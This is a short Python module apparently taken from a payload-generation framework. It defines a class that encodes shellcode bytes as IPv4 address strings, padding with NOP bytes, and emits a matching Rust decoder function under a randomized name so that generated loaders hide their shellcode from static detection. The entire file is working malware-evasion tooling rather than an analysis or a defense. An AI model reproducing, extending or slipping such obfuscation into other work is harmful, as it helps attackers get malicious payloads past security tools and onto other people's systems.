import random
import string

class IPv4Obfuscate:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return f"""
fn {self.name}(encoded: &[&str]) -> Vec<u8> {{
    let mut decoded: [u8; {self.size}] = [0; {self.size}];
    for (i, ip) in encoded.iter().enumerate(){{
        let octets: Vec<&str> = ip.split('.').collect();
        for (j, octet) in octets.iter().enumerate(){{
            if i*4+j >= {self.size}{{
                return decoded.to_vec()
            }}
            decoded[i*4 + j] =  octet.parse::<u8>().unwrap();
        }}
    }}
    decoded.to_vec()
}}
"""
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        self.size = len(decoded)
        for i in range(0, len(decoded), 4):
            chunk = decoded[i:i+4]
            if len(chunk) < 4:
                chunk = chunk + (b"\x90" * (4 - len(chunk)))
            encoded.append('.'.join([f'{chunk[n]}' for n in range(0, 4)]))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}(&{{shellcode}})')